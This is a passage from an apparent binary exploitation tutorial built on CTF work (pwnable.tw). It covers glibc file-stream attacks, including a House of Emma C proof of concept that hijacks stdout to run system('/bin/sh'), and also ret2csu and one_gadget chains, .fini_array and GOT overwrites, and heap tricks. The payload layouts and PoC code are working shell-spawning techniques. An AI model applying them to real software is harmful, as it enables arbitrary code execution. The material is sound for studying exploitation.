2. `__xputn` looks at `write_ptr >= write_end` => trigger `__overflow` also from substituted vtable:

```text
[#1] 0x7ffff7c887ed → _IO_wfile_overflow()
[#2] 0x7ffff7c8661b → _IO_wdefault_xsputn()
[#3] 0x7ffff7c89413 → _IO_wfile_xsputn()
[#4] 0x7ffff7c836a9 → puts()
```

3. `__overflow` from `_IO_wfile_jumps` understand that wide file is specific and it need pull callback from `_wide_data` via `_IO_wdoallocbuf`:

```text
[#1] 0x7ffff7c8684e → _IO_wdoallocbuf()
[#2] 0x7ffff7c887ed → _IO_wfile_overflow()
[#3] 0x7ffff7c8661b → _IO_wdefault_xsputn()
[#4] 0x7ffff7c89413 → _IO_wfile_xsputn()
[#5] 0x7ffff7c836a9 → puts()
```

4. Where `_IO_wdoallocbuf` is a wrapper on `_wide_vtable` callback:

```text
$rax   : 0x000055555555b320  →  0x0000000000000000      <== fake _wide_data
$rdi   : 0x00007ffff7dff7a0  →  0x3b68733bfbad1810      <== arg for system

0x7ffff7c86844 <_IO_wdoallocbuf+0024> mov    rax, QWORD PTR [rax+0xe0]      <== reach fake _wide_vtable from _wide_data
0x7ffff7c8684b <_IO_wdoallocbuf+002b> call   QWORD PTR [rax+0x68]          <== call system(<flag> + ';sh;')
```

5. And here we are:

```text
[#0] 0x7ffff7c552b0 → system()
[#1] 0x7ffff7c8684e → _IO_wdoallocbuf()
[#2] 0x7ffff7c887ed → _IO_wfile_overflow()
[#3] 0x7ffff7c8661b → _IO_wdefault_xsputn()
[#4] 0x7ffff7c89413 → _IO_wfile_xsputn()
[#5] 0x7ffff7c836a9 → puts()
[#6] 0x55555555520a → main()
```

---

### 5.7 House of Emma

If you have a write primitive that lets you write to pages below libc pages, or you have a read primitive to read those pages + you have a libc leak and an arbitrary write primitive, you can use this technique.

First let me explain what House of Emma exploits and how it works.

`_IO_cookie_file` extends the standard methods of `_IO_FILE_plus` by adding user callbacks for different events:

```c
struct _IO_cookie_file {
  struct _IO_FILE_plus __fp;        /* standard _IO_FILE_plus but with _IO_cookie_jump vtable */
  void *__cookie;                   /* cookie as the 1st argument to user callbacks */
  cookie_io_functions_t __io_functions;
};
```

Where `cookie_io_functions_t __io_functions` is a structure that includes 4 mangled pointers to user-defined callbacks: **read (+ 0x0)**; **write (+ 0x8)**; **seek (+ 0x10)**; **close (+ 0x18)**.

It can be reached with a direct `fopencookie()` in code, but that's not what we're talking about now. You need to know the chain of calls from `_IO_cookie_jump` to `__io_functions` and what a pointer guard is:

**1.** When a file stream detects any event, it goes to its own vtable `_IO_cookie_jump`, where pointers to wrappers over `__io_functions` are defined (for example - a write event).

**2.** It executes code at the pointer `_IO_cookie_jump + 0x78` (`_IO_cookie_write` from the vtable):

```c
static ssize_t _IO_cookie_write (FILE *fp, const void *buf, ssize_t size) {
  struct _IO_cookie_file *f = (struct _IO_cookie_file *) fp;
  cookie_write_function_t *write_cb = f->__io_functions.write;  /* offset + 0x8 */

  /* now write_cb is a pointer protected by the pointer guard (mangled) */

  #ifdef PTR_DEMANGLE
  PTR_DEMANGLE (write_cb);  /* demangle it to get the raw pointer to the write callback */
  #endif

  if (write_cb != NULL)
    return write_cb (f->__cookie, buf, size);  /* call it with the cookie as the 1st argument */
  return size;
}
```

**3.** As you can see, first we take the write callback from `__io_functions` for write, but it is mangled with the pointer guard:

```
PTR_MANGLE (n) <=> ROL(n ^ POINTER_GUARD, 0x11)
```

Where ROL is a rotate left (BITS is the number of bits in the register on your arch):

```
ROL (n, k) <=> ((n << k) | ((n >> (BITS - k))) & ((1 << BITS) - 1)
```

And the pointer guard is located at `$fs_base + 0x30`:

```
gef➤  x/gx $fs_base + 0x30
0x7ffff7fb3770: 0xfca6d27b4c2dabde
```

And `0x7ffff7fb3770` from the pages below libc:

```
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /path/2/code
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /path/2/code
    ...
0x00007ffff7c00000 0x00007ffff7c28000 0x0000000000000000 r-- /path/2/libc
0x00007ffff7c28000 0x00007ffff7dc0000 0x0000000000028000 r-x /path/2/libc
    ...
0x00007ffff7e14000 0x00007ffff7e21000 0x0000000000000000 rw-
0x00007ffff7fb3000 0x00007ffff7fb8000 0x0000000000000000 rw-   <== right here
0x00007ffff7fb8000 0x00007ffff7fbc000 0x0000000000000000 r-- [vvar]
0x00007ffff7fbc000 0x00007ffff7fbe000 0x0000000000000000 r-- [vvar_vclock]
0x00007ffff7fbe000 0x00007ffff7fc0000 0x0000000000000000 r-x [vdso]
0x00007ffff7fc0000 0x00007ffff7fc1000 0x0000000000000000 r-- /path/2/ld
    ...
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```

This is a random value for each process launch, so you must find a way to figure it out or overwrite it.

**4.** Now we need to bring it into shape with `PTR_DEMANGLE (write_cb)`:

```
PTR_DEMANGLE (n) <=> ROR(n, 0x11) ^ POINTER_GUARD
```

Where ROR is a rotate right:

```
ROR(n, k) <=> ((n >> k) | (n << (BITS - k))) & ((1 << BITS) - 1)
```

**5.** And finally, we call `write_cb (f->__cookie, buf, size)`.

And as you might have guessed, we have to overwrite the vtable with `_IO_cookie_jumps`, which passes `_IO_vtable_validate()`, put an argument for arbitrary code after it (as usual, the address of `b'/bin/sh\x00'` for system), place 4 mangled callbacks (but you can actually put just one relevant callback for your event), and solve the problem with the pointer guard.

This is my PoC for stdout manipulation (compiled with `-o -g`; run without ASLR; absolute addresses may differ):

```c
#include "stdio.h"

int main() {
    /* _IO_cookie_jump + offset to reach _IO_cookie_write, since __xputn & __cookie will be put into $rdi*/
    long shifted_io_cookie_jump = 0x7ffff7e11420 + 0x40;
    char* __cookie = "/bin/sh\0";

    long system = 0x7ffff7c00000 + 0x5c560;
    long pointer_guard = *(long*)(0x7ffff7fb3740 + 0x30);

    /* PTR_MANGLE(system) */
    unsigned long mangled_sys = system ^ pointer_guard;
    mangled_sys = ((mangled_sys << 0x11) | (mangled_sys >> (64 - 0x11)));

    /* VULN */
    *((long*)stdout + 27) = shifted_io_cookie_jump;
    *((long*)stdout + 28) = (long)__cookie;
    *((long*)stdout + 30) = (long)mangled_sys;

    puts("sayhi");

    return 0;
}
```

And a few small clarifications:

**1.** `_IO_cookie_jumps` is not exported from libc, even if you loaded debug symbols. So it is placed in the "glibc vtable range" as usual below `_IO_wfile_jumps` with an offset (in glibc 2.43-2ubuntu2_amd64 it is placed at `_IO_wfile_jumps + 0x1f0`).

**2.** `stdout` was not set via `fopencookie()`, so it uses the "default" offsets in the vtable for any event. For example, the write event pulls `__xputn` with offset 0x38, but we need to pull `_IO_cookie_write` with offset 0x78, so we just add 0x40 to `_IO_cookie_jumps` to reach what we need.

**3.** When you handle mangling with the pointer guard, make sure you work in an unsigned context, otherwise you will face the arithmetic right shift instruction - `sar`. And if the xor result of the pointer and the mangled ptr is negative in a signed context, `sar` will drag the sign bit through the whole shift and you will get something like `0xffffffffffffa92b`. Just use an unsigned context to use the classic `shr` instead of `sar`.

Let's check it out (following the source code of `_IO_cookie_write`) with call stack dumps:

`stdout` layout after the overwrite:

```
0x7ffff7e13580 <_IO_2_1_stdout_>:       0x00000000fbad2a84      0x000055555555b010
    ...
0x7ffff7e13650 <_IO_2_1_stdout_+208>:   0x0000000000000000      0x00007ffff7e11460  <== shifted _IO_cookie_jumps
0x7ffff7e13660 <stderr>:                0x0000555555556007              <== pointer to b'/bin/sh\x00'
0x7ffff7e13670 <stdin>:                 0x673097a23150e090              <== mangled write callback (system)
```

**1.** Get our shifted `_IO_cookie_vtable`:

```
0x7ffff7c8eb90 <puts+0050>      mov    rax, QWORD PTR [rdi+0xd8], where $rdi is stdout
```

now `$rax : 0x00007ffff7e11460 → 0x00007ffff7c9d5d0 → <_IO_default_xsgetn+0000> endbr64`

```
0x7ffff7c8ebb7 <puts+0077>      call   QWORD PTR [rax+0x38]
```

where `$rax + 0x38 : 0x7ffff7e11498: 0x00007ffff7c8cbb0` - the address of `_IO_cookie_write`

```
[#0] 0x7ffff7c8cbb0 → endbr64  <== _IO_cookie_write
[#1] 0x7ffff7c8ebba → puts()
[#2] 0x5555555551e7 → main()
```

**2.** Execution of `_IO_cookie_write`:

```
0x7ffff7c8cbb4                  mov    rax, QWORD PTR [rdi+0xf0] <== load the mangled ptr
0x7ffff7c8cbbb                  ror    rax, 0x11                  <== 1st demangle step
0x7ffff7c8cbbf                  xor    rax, QWORD PTR fs:0x30     <== 2nd demangle step
```

After demangling `$rax : 0x00007ffff7c5c560 → <system+0000> endbr64`

```
0x7ffff7c8cbd7                  mov    rdi, QWORD PTR [rdi+0xe0] <== put __cookie into $rdi
0x7ffff7c8cbde                  call   rax
```

**3.** And here we are:

```
$rdi   : 0x0000555555556007  →  0x0068732f6e69622f ("/bin/sh"?)

[#0] 0x7ffff7c5c560 → system()
[#1] 0x7ffff7c8cbe0 → cmp r12, rax
[#2] 0x7ffff7c8ebba → puts()
[#3] 0x5555555551e7 → main()
```

## BONUS

### 6.1 Off-By-One

Sometimes a program **doesn't check the condition** when we are writing at an index which equals the length of the buffer. It means that we can rewrite **one chunk after the buffer**.

It can include max available values or *metadata of the chunk header*. If we rewrite it we can get control of critical structures to get access to something.

---

### 6.2 PLT-Trampoline

If we have a **not small primitive of writing to the `.got` section** of our binary we can make a *very powerful attack*. All we need - **".got grooming"** before exploitation.

But before this let me tell you about a couple of technical things:

1) The beginning of `.got` section includes **very important addresses for lazy-bound**: with `+0x8` offset the *linkage map* and with `+0x10` offset the *address of the resolver*.

2) After `.got` overwrite we can rewrite `RIP` as we want including a part of the `.plt` section which calls the resolver (the beginning of `.plt`) and we'll call these instead of a valid glibc function:

```
0000000000001020 <.plt>:
   1020:  ff 35 72 2f 00 00       push   QWORD PTR [rip+0x2f72]        # 3f98 <_GLOBAL_OFFSET_TABLE_+0x8>
   1026:  f2 ff 25 73 2f 00 00    bnd jmp QWORD PTR [rip+0x2f73]        # 3fa0 <_GLOBAL_OFFSET_TABLE_+0x10>
```

So, after rewriting `_GLOBAL_OFFSET_TABLE_+0x8` and `_GLOBAL_OFFSET_TABLE_+0x10` we can take **full control of the execution** of the program - we just put the address of the argument to the stack and call the function we need.

I can even show a *real case* for you:

```
0000000000045be0 <setcontext@@GLIBC_2.2.5>:
   45be0:  57                      push   rdi
   45be1:  48 8d b7 28 01 00 00    lea    rsi,[rdi+0x128]
   45be8:  31 d2                   xor    edx,edx
   45bea:  bf 02 00 00 00          mov    edi,0x2
   45bef:  41 ba 08 00 00 00       mov    r10d,0x8
   45bf5:  b8 0e 00 00 00          mov    eax,0xe
   45bfa:  0f 05                   syscall
   45bfc:  5a                      pop    rdx
   45bfd:  48 3d 01 f0 ff ff       cmp    rax,0xfffffffffffff001
   45c03:  73 5b                   jae    45c60 <setcontext@@GLIBC_2.2.5+0x80>
   45c05:  48 8b 8a e0 00 00 00    mov    rcx,QWORD PTR [rdx+0xe0]
   45c0c:  d9 21                   fldenv [rcx]
   45c0e:  0f ae 92 c0 01 00 00    ldmxcsr DWORD PTR [rdx+0x1c0]
   45c15:  48 8b a2 a0 00 00 00    mov    rsp,QWORD PTR [rdx+0xa0]
   45c1c:  48 8b 9a 80 00 00 00    mov    rbx,QWORD PTR [rdx+0x80]
   45c23:  48 8b 6a 78             mov    rbp,QWORD PTR [rdx+0x78]
   45c27:  4c 8b 62 48             mov    r12,QWORD PTR [rdx+0x48]
   45c2b:  4c 8b 6a 50             mov    r13,QWORD PTR [rdx+0x50]
   45c2f:  4c 8b 72 58             mov    r14,QWORD PTR [rdx+0x58]
   45c33:  4c 8b 7a 60             mov    r15,QWORD PTR [rdx+0x60]
   45c37:  48 8b 8a a8 00 00 00    mov    rcx,QWORD PTR [rdx+0xa8]
   45c3e:  51                      push   rcx
   45c3f:  48 8b 72 70             mov    rsi,QWORD PTR [rdx+0x70]
   45c43:  48 8b 7a 68             mov    rdi,QWORD PTR [rdx+0x68]
   45c47:  48 8b 8a 98 00 00 00    mov    rcx,QWORD PTR [rdx+0x98]
   45c4e:  4c 8b 42 28             mov    r8,QWORD PTR [rdx+0x28]
   45c52:  4c 8b 4a 30             mov    r9,QWORD PTR [rdx+0x30]
   45c56:  48 8b 92 88 00 00 00    mov    rdx,QWORD PTR [rdx+0x88]
   45c5d:  31 c0                   xor    eax,eax
   45c5f:  c3                      ret
```

We can just prepare a **setcontext struct** (`ucontext_t` as I remember) somewhere in memory and put its address to `_GLOBAL_OFFSET_TABLE_+0x8` and put the address of `setcontext + offset to pop rdx` to `_GLOBAL_OFFSET_TABLE_+0x10`.

It **resets all registers** including `rsp` and basically can give a *reverse shell* if we place in `rdi` `"/bin/sh\0"` and place `RIP` on `system()` with aligned `RSP`, because we control it too. Or just make `execve` with **stack pivoting**. Your border is your imagination here ;)

---

### 6.3 One Gadget

If we have only **1 qword** (or dword if we are working with 32-bits) to overflow and you have a **libc leak** we can use the *one-gadget* technique.

It means that we'll call a part of libc code which calls `execve("bin/sh\0", arg1, arg2)` where `arg1 = rsi` and `arg2 = rdx`.

But you should be sure that `rsi` and `rdx` are **valid addresses or NULL**. Just two rules. `execve()` does something like *"lazy reading"* - it will look at the arguments when it's necessary and all of this is because we can just put an address from the address space of our process (with flag for reading) and start `execve()`. But the best way to do this - get `NULL` in `argv` & `envp`. [True definition of valid `argv`/`envp` is an array with pointers to strings with "arguments" which ends by `NULL` pointer.]

So, output of `one_gadget` utility on ruby looks like:

```
$ one_gadget /usr/lib/x86_64-linux-gnu/libc.so.6

0xde6c3 execve("/bin/sh", rbp-0x40, r13)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp
```

`rbp-0x40` and `r13` means that `rsi` and `rdx` will be get from them. It means that with address `<libc_base> + 0xde6c3` we have a one gadget. Let's check an objdump:

```
[one gadget part]
de6c3:  4c 8d 35 72 97 0c 00    lea    r14,[rip+0xc9772]        # 1a7e3c <...>
de6ca:  48 89 7d c8             mov    QWORD PTR [rbp-0x38],rdi
de6ce:  4c 8d 65 c0             lea    r12,[rbp-0x40]
de6d2:  4c 89 75 c0             mov    QWORD PTR [rbp-0x40],r14
de6d6:  eb 83                   jmp    de65b <execvp@@GLIBC_2.2.5+0xab>

[execvp part]
00000000000de5b0 <execvp@@GLIBC_2.2.5>:
de5b0:  48 8b 05 01 6a 13 00    mov    rax,QWORD PTR [rip+0x136a01]        # 214fb8 <...>
de5b7:  48 8b 10                mov    rdx,QWORD PTR [rax]
de5ba:  e9 61 04 00 00          jmp    dea20 <execvpe@@GLIBC_2.11>
...
de8d6:  48 8b 7d a8             mov    rdi,QWORD PTR [rbp-0x58]
de8da:  4c 89 ea                mov    rdx,r13
de8dd:  4c 89 e6                mov    rsi,r12
de8e0:  4c 89 45 90             mov    QWORD PTR [rbp-0x70],r8
de8e4:  e8 67 fc ff ff          call   de550 <execve@@GLIBC_2.2.5>
```

Finally we'll call `execve()`.

*P.S.* You can use already known techniques like **stack pivoting** to control `RSP`/`RBP` or use program logic to groom our *"future arguments"* (if it's possible of course) if you haven't `NULL` pointers.

*P.s* you probably will be faced with another *"rules"* of the one gadget. For example - `$esi` must points to `libc.got.plt` section and other.

---

### 6.4 __libc_csu_init Exploitation aka ret2csu

Every GCC binary (without `-nostdlib` compiling flag) has the `__libc_csu_init` function, so this initializes libc, libc's structures, `__frame_dummy_init_array_entry`, `__do_global_dtors_aux_fini_array_entry` and others.

If you haven't PIE or found a way to leak the code address you can use the **ret2csu** technique (you can use it to call `read()`/`write()`/`open()` and others in `.plt`).

Let's look at the disasm:

```
0000000000400ba0 <__libc_csu_init>:
  400ba0:  41 57                   push   r15
  400ba2:  41 56                   push   r14
  400ba4:  49 89 d7                mov    r15,rdx
  400ba7:  41 55                   push   r13
  400ba9:  41 54                   push   r12
  400bab:  4c 8d 25 be 11 20 00    lea    r12,[rip+0x2011be]        # 601d70 <__frame_dummy_init_array_entry>
  400bb2:  55                      push   rbp
  400bb3:  48 8d 2d be 11 20 00    lea    rbp,[rip+0x2011be]        # 601d78 <__do_global_dtors_aux_fini_array_entry>
  400bba:  53                      push   rbx
  400bbb:  41 89 fd                mov    r13d,edi
  400bbe:  49 89 f6                mov    r14,rsi
  400bc1:  4c 29 e5                sub    rbp,r12
  400bc4:  48 83 ec 08             sub    rsp,0x8
  400bc8:  48 c1 fd 03             sar    rbp,0x3
  400bcc:  e8 17 fb ff ff          call   4006e8 <_init>
  400bd1:  48 85 ed                test   rbp,rbp
  400bd4:  74 20                   je     400bf6 <__libc_csu_init+0x56>
  400bd6:  31 db                   xor    ebx,ebx
  400bd8:  0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
  400bdf:  00
  400be0:  4c 89 fa                mov    rdx,r15
  400be3:  4c 89 f6                mov    rsi,r14
  400be6:  44 89 ef                mov    edi,r13d
  400be9:  41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  400bed:  48 83 c3 01             add    rbx,0x1
  400bf1:  48 39 dd                cmp    rbp,rbx
  400bf4:  75 ea                   jne    400be0 <__libc_csu_init+0x40>
  400bf6:  48 83 c4 08             add    rsp,0x8
  400bfa:  5b                      pop    rbx
  400bfb:  5d                      pop    rbp
  400bfc:  41 5c                   pop    r12
  400bfe:  41 5d                   pop    r13
  400c00:  41 5e                   pop    r14
  400c02:  41 5f                   pop    r15
  400c04:  c3                      ret
  400c05:  90                      nop
  400c06:  66 2e 0f 1f 84 00 00    cs nop WORD PTR [rax+rax*1+0x0]
  400c0d:  00 00 00
```

Parts `0x400bfa - 0x400c04` and `0x400be0 - 0x400be9` look interesting, so try to find a way how you can exploit it until you read down.

This will be actually the **most elegant way** to assemble a ROP chain unless you have in the binary gadgets like:

```
pop rdi ; ret
pop rsi ; ret
pop rdx ; ret
```

(or you can't get a libc leak yet) and if you have a writing primitive to **9-10 gadgets** (buffer overflow or arbitrary write or stack pivot) if you want to just complete one function or **16-20 gadgets** if you want to continue ROP (stack pivot is a good way or large writing primitive if you have it).

We can separate this function into 2 parts:

```
[Part 1 - Pop registers]
  400bfa:  5b                      pop    rbx
  400bfb:  5d                      pop    rbp
  400bfc:  41 5c                   pop    r12
  400bfe:  41 5d                   pop    r13
  400c00:  41 5e                   pop    r14
  400c02:  41 5f                   pop    r15
  400c04:  c3                      ret
```

Preparing `r15`, `r14`, `r13d` to move them to `rdx`, `rsi`, `edi` and preparing `r12` & `rbx` to get an address of an address which points to the part of code (*double pointer* because `call` waits for an address), so you can put in `rbx` the address of `.got` **divided by 8** and `r12 = 0`. It works, because the address of `.got` section points (and its address `% 8 == 0`) to an address from libc (and `rbx` will be multiplied by 8).

```
[Part 2 - Call via registers]
  400be0:  4c 89 fa                mov    rdx,r15
  400be3:  4c 89 f6                mov    rsi,r14
  400be6:  44 89 ef                mov    edi,r13d
  400be9:  41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
```

So, after returning to this part from the previous part we'll transfer control with arguments which we want. But look at the part after the called function returns:

```
  400bed:  48 83 c3 01             add    rbx,0x1
  400bf1:  48 39 dd                cmp    rbp,rbx
  400bf4:  75 ea                   jne    400be0 <__libc_csu_init+0x40>
  400bf6:  48 83 c4 08             add    rsp,0x8
```

Okay, we'll just increment `rbx` and compare it with base pointer. They **must be equal** if we plan to continue ROP. But after this we need to consider the stack state because `rbx`, ..., `r15` will be popped again (so, we can use *several ret2csu techniques in one ROP*).

Payload may look like:

```
1. 0x400bfa              (first part of __libc_csu_init)
2. target_address / 8    (rbx)
3. target_address / 8 + 1
4. 0                     (r12 is zero because rbx * 8 already points properly)
5. 1st arg               [dword] (r13d -> edi)
6. 2nd arg               [qword] (r14 -> rsi)
7. 3rd arg               [qword] (r15 -> rdx)
8. 0x400be0              (second part of __libc_csu_init)

9, 10, ... gadgets may be args to the next call of another function via
__libc_csu_init or just be a continuation of the ROP.
```

### 6.5 Anyway Check What Stack / Heap / .data & .bss Includes

When I was solving a task from **pwnable.tw** (`deaslr` 500) I faced a *large writing primitive* and **no way to leak any address**. So, I just needed to look at the stack and find an `ld.so` gadget which calculated an address based on the content in `$rbx` and an offset in `$r15`. When you are solving the same tasks - without leaks, gadgets like these and arithmetics are your **best friends**. You have to try to find something which the address space of your process already includes.

If you are thinking that potentially way to pwn it is wrong, first of all be sure that it is. Just check objdump and analyze it : *"Why it's wrong?"* For example, when I solved `"dubblesort"` from also pwnable I thought that `system('/bin/sh')` couldn't be called properly, because payload must have specific format - I couldn't just put `[pop ebx ; ret -> '/bin/sh' -> system]`. But `system()` in x86 already took an argument from the stack and it argument must be place under the address of `system()`... So, I tried to use `one_gadget`, make a `ret2main`, leak canary to build context, leak ld to find correct gadget instead just buid payload from 2 parts with that knowledge... So, before discard the variant I advise you to make sure **"at the lowest level"** that you a right... Or not ;) And if you have two variants - try the **simpler one first** on remote, because environment differences can kill an elegant local exploit.

In conclusion I must tell you that our deal is always **guessing, discovering** and hope that we'll find a way to pwn it. But of course, without brilliant technical knowledge this point is unreachable.

---

### 6.6 .init_array / .fini_array overwrite

When your process was deployed, first of all code `_start` (or another entry tag) was called. It provides arguments such as `main` address, `init` wrapper and `fini` wrapper to initializator. Next, `_start` calls `__libc_csu_init` with those arguments and `init` wrapper was called as beginning after libc and other initialization it calls `main` and after `main` returning it calls `fini` wrapper. Of course these wrappers need arguments like special structures as `.init`/`.fini_array` which include addresses of especially resolvers' codes and situate at the `.data`/`.bss` sections as usual. So, if you have arbitrary write primitive with **Partial RelRO** and **no PIE** or you know addresses you'll can overwrite those structs. It means that you can take a control of beginning/ending of a program (ending as usual) via overwriting resolvers' addresses and after main code goes to your instructions instead of ends.

Look at this:

```c
void processEntry entry(undefined8 param_1,undefined8 param_2) {
  undefined1 auStack_8 [8];
  FUN_00401eb0(main,param_2,&stack0x00000008,FUN_004028d0,FUN_00402960,param_1,auStack_8);
  while( true );
}
```

`FUN_004028d0` - *init wrapper*
`FUN_00402960` - *fini wrapper*

Now find structs:

```
readelf -a ./prog | grep -E ".init_array|.fini_array"
  [15] .init_array       INIT_ARRAY       00000000004b40e0  000b30e0    <== addresses at the rw-
  [16] .fini_array       FINI_ARRAY       00000000004b40f0  000b30f0        section (.data or .bss)
```

`0x00000000004b40f0` is an address of `.fini_array`. Let's check it in gdb:

```
gef➤  x/2gx 0x0000000004b40f0
0x4b40f0:       0x0000000000401b00      0x0000000000401580
```

Well, these are addresses of fini resolvers. Let me explain you what are mean:

```
0x4b40f0 + 0x0 ==> 0x0000000000401b00 - addres of _do_global_dtors_aux which destructs
                    global objects like structs and another obj
                    which not destructed to ending of a prog.
                    It was called after 0x0000000000401580

0x4b40f0 + 0x8 ==> 0x0000000000401580 - address of __libc_csu_fini which finalize our main
                    and another prog resourses. It triggers all of finalizators
                    and destructors including _do_global_dtors_aux
                    via basically calls or rets
```

But content of these addresses still depends by linker. I advise you to check it anyway. So, after execution of `[ 0x4b40f0 + 0x8 ]` control transfers to `[ 0x4b40f0 + 0x0 ]`.

All of what are we need - overwrite **one of these** to get a one more *"cycle"* via `[ 0x4b40f0 + 0x8 ]` or **both of them** ( `_do_global_dtors_aux` + `__libc_csu_fini` ) to make one *"cycle"* + one block of code or **endless "cycle" of main**. Let's look at the last way:

If `FUN_00402960` (which address is `0x402960`) is fini wrapper just put it instead of `_do_global_dtors_aux` at `[ 0x4b40f0 + 0x0 ]`. And address of `main` instead of `__libc_csu_fini` at `[ 0x4b40f0 + 0x8 ]`

```
gef➤  x/2gx 0x0000000004b40f0
0x4b40f0:       0x0000000000402960      0x0000000000401b6d
```

Finally, after `main` we go to `[ 0x4b40f0 + 0x8 ]` to execute it's code == **go to main again**. And after `main`'s returning we'll go to `[ 0x4b40f0 + 0x0 ]` - to the fini wrapper instead of `_do_global_dtors_aux`. Next, fini wrapper will looks at the `[ .fini_array + 0x8 ]` == `[ 0x4b40f0 + 0x8 ]` and will see `0x401b6d`. It think that it's a resolver address and calls it - **calls main!** And after `main`'s ending we'll go again to `[ 0x4b40f0 + 0x0 ]`. I think you got it ;)

*p.s.* if you have went here after ROP part - let me to tell you a couple of word about `'leave'`. In my case: after cycles of the main `$rbp` became was equal to `.fini_array`'s address and let me to used `'leave'` to pivot stack to `.fini_array + 0x8` address (`rsp -> .fini_array` ; `pop rbp` took one qword from a top of stack and `rsp + 0x8`) where with `+0x8` offset from `$rsp` (`+0x10` from `.fini_array`) I already had a groomed *"stack frame"* with a ROP chain.

If you interested I had two ways (my payload began at `.fini_array + 0x10`):
1) rewrite `[ .fini_array + 0x8 ]` to `"ret"` gadget and go to ROP chain immediately
2) don't do this and pass one more main calling to after `main`'s `"ret"` go to `[ .fini_array + 0x10 ]` ROP

---

### 6.7 Arguments control via EBP/RBP

In such cases when you have **"partial" or full arbitrary write primitive** & you have a **stack leak** you can make the `$EBP`/`$RBP` control attack. I hope you understand stack-frame layout. Any arguments and local variables depends on stack pointer address. So, your binary via `"lea"` with offset from stack pointer calculates addresses of local variables and uses it in the code. So, if you have a way to overwrite this pointer to prepared memory space you'll can control function with it's arguments.

Let's look at an example:

```c
void handler(void) {
  int selected_opt;
  char input [22];

  do {
    printf("> ");
    read(input,0x15);                    /* CONTROL THIS */
    selected_opt = atoi(input);          /* GOT OVERWRITTEN */
    switch(selected_opt) { /* callbacks for each case */ }
  } while( true );
}
```

This `handler()` calls something callback where we have **arbitrary write primitive**. It means that we can find a base pointer of this callback and overwrite it to payload (for example - *address near GOT sections*).

After callback's finish base pointer becomes our overwrited address:

```
mov esp, ebp
pop ebp      <== HERE
ret
```

It means that next cycle of `handler()` will calculate local variable addresses relative our rewritten base pointer. So, `input` will becomes `$ebp + 0x22`. And if we put `atoi@got - 0x22` to `$ebp`, `read()` will be called like:

```
read(atoi@got, 0x15);
```

And we'll overwrite `atoi@got` arbitrary data. For example - `system()` address concatenated with `";sh;"`. And next `atoi()` will be called like `system(system + ";sh;")`. Command string interpreter will try to execute address of `system`, but won't can do it. Next, it will look at the first `";"` and will understand that prompt doesn't end and go to next command. Which situaded at the left side from first `";"`. The second `";"` to be sure that `"sh"` string terminated. To be safe from garbage data from the right side from `"sh"`. And we'll got a shell.

---

### 6.8 Condition issues

Sometimes process checks itself conditions **after** executing something. It means that it can do something, for example `realloc(ptr, 0)` from unexpected function, after it check : *"Can user do free via realloc(ptr, 0) from this fn?"* and finally log warning about wrong attemp to do this.

So, we can do something unexpected thing which denied by programm's logic. But programm pass it because process **checks condition after** that event.

Look at the example (from `re-alloc`, pwnable.tw):

There is part of vulnerable `reallocate()` function:

```c
__size = read_long();

if (__size < 0x79) {
    reallocated = realloc(*(void **)(heap + idx * 8),__size);

    if (reallocated == (void *)0x0) {
        puts("alloc error");          // log about allocation error function ends
    }
}
```

And this is the "correct" free part - `rfree()`:

```c
realloc(*(void **)(heap + idx * 8),0);
*(undefined8 *)(heap + idx * 8) = 0;      <== pointer invalidation
```

So, if we free chunk via this `rfree()` we'll set ptr to `NULL` and loose **UAF primitive**. But if we free chunk via `reallocate` with `__size = 0` we'll free chunk but **won't invalidate ptr**. It means that we can do `realloc()` at this chunk again and overwrite `'fd'` and `'bk'` ptrs.

---

### 6.9 How to put fake chunk to unsorted bin

As we know, one way to leak libc address is free chunk to **unsorted bin**. It's `fd` & `bk` becomes main arena addresses. But what if we can allocate size only less than `0x80`? If you have arbitrary write primitive via **tcache-poisoning** or something else, you can assembly several fake chunks with properly chunk structure (header + data).

In my case (`tcache-tear` from pwnable) I placed fake chunk with fake header to `.data` and tried to free it... And I got **memory corruption** on smth like that in `free()`. The fact in that `free()` when tcache fullfilled and size more than `0x80` (max available for fastbin) checks not only one chunk struct - it checks that one fake chunk with fake size, next chunk and next after next chunk! It expects valid 2 next chunks to check : *"Can I consolidate next chunks with chunk from free()?"*

It means that I must do care about **3 consecutive chunks** with 3 conditions:

1. Structures of fake chunks must be properly
2. Structures of fake chunks must be aligned on `0x10` bytes
3. `PREV_INUSE` flag must be set to pass consolidation

We need 3rd fake chunk because allocator check it's PREV_INUSE to answer : `Can I do forward consolidation?`

Well, and after all of those my fake chunk really was freed to unsorted bin and via **UAF** I got libc leak.

### 6.10 NX unknown

Unknown NX means that process isn't sure about memory protection of any page. If such binary executing remotely you'll can try to `ret2shellcode` to any writeable page (remotely it's **rwx**). But locally heap still can be **rw-** like another pages (`.data`, heap, stack and other). For debug you can do `mprotect(start*, n, 0x7)` for necessary page via gdb. I faced with it during solving `Death_note` from pwnable.

When `checksec` shows you:

```
[*] '/home/sayhi/Desktop/ctf/pwnable/solved/death-note/death_note'
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing <== RIGHT HERE
PIE:        No PIE (0x8046000)
Stack:      Executable
RWX:        Has RWX segments
RUNPATH:    b'./lib/'
Stripped:   No
```

It's a reason to try **shellcoding** if you can't find another way to pwn it ;)

---

### 6.11 Unaligned address of malloc from fastbins

Interesting fact : `malloc()` must returns address which aligned by `0x10` bytes. But I discovered for myself that it's **not exactly**. So, before glibc 2.41, when fastbin dup don't required movement chunks from fastbins to tcache you can make arbitrary allocation if *"environment"* looks like chunk structure. It means that you can substitute `"fd"` pointer to any address which includes valid `"size"` field. And if you want to get the allocation where you haven't properly structure at aligned address, You can use this trick to bypass (fastbin) `!prev_size` sigabort :

All of we need - memory space where you want to allocate must includes value which we can use as size. Don't forget that fastbins chunks `fd` points to **header of another chunk**. Unlike `fd` at tcache. Let me show example at FSOP context:

So, this is a `_IO_FILE_plus` structure of `stdout`. And we want to overwrite it's vtable address.

```
gef➤  x/30gx 0x7ffff7bc4620
